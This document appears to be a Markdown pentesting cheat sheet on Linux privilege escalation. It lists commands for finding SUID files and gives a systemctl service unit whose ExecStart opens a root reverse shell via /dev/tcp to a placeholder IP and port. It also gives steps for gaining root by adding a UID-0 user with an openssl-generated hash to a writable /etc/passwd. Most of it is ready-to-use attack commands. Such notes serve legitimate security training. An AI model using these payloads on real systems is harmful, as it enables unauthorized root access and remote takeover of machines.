# Using files with SUID permission set

## What is SUID?

Set owner User ID, also known as Set user ID or setuid is a special flag in linux permission set.

## Find files with SUID set

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

```
find / -perm -u=s -type f 2>/dev/null
```

## systemctl

#### Reverse shell to root user

```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1"
```

## Modifying /etc/passwd with write access

With a user that has write access to `/etc/passwd` file, we can add a new user credentials and gain root user access.

* Generate a new password hash using the username as salt, here we are going to use `new` as a salt and `123` as our password.

```bash
openssl passwd -1 -salt new 123
```

* Next copy the hash generated, change the following entry and  enter it into the `/etc/passwd` file's end. Remember to change new with your selected username.

```
new:<hash>:0:0:root:/root:/bin/bash
```

* Now we use the following command and supply our password to gain root access.

```bash
su new   
```

